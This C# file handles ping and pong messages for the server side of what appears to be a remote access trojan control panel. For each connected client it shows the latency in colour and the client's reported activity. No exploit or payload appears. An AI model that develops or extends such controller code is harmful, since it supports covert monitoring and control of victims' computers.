using System.Diagnostics;
using System.Drawing;
using System.Threading;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
    public class HandlePing
    {
        public void Ping(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").SetAsString("Po_ng");
                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                lock (Settings.LockListviewClients)
                {
                    if (client.LV != null)
                        client.LV.SubItems[Program.Form1.lv_act.Index].Text =
                            unpack_msgpack.ForcePathObject("Message").AsString;
                    else
                        Debug.WriteLine("Temp socket pinged server");
                }
            }
            catch
            {
            }
        }

        public void Po_ng(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                lock (Settings.LockListviewClients)
                {
                    if (client.LV != null)
                    {
                        client.LV.SubItems[Program.Form1.lv_ping.Index].Text =
                            unpack_msgpack.ForcePathObject("Message").AsInteger + " MS";
                        if (unpack_msgpack.ForcePathObject("Message").AsInteger > 600)
                            client.LV.SubItems[Program.Form1.lv_ping.Index].ForeColor = Color.Red;
                        else if (unpack_msgpack.ForcePathObject("Message").AsInteger > 300)
                            client.LV.SubItems[Program.Form1.lv_ping.Index].ForeColor = Color.Orange;
                        else
                            client.LV.SubItems[Program.Form1.lv_ping.Index].ForeColor = Color.Green;
                    }
                }
            }
            catch
            {
            }
        }
    }
}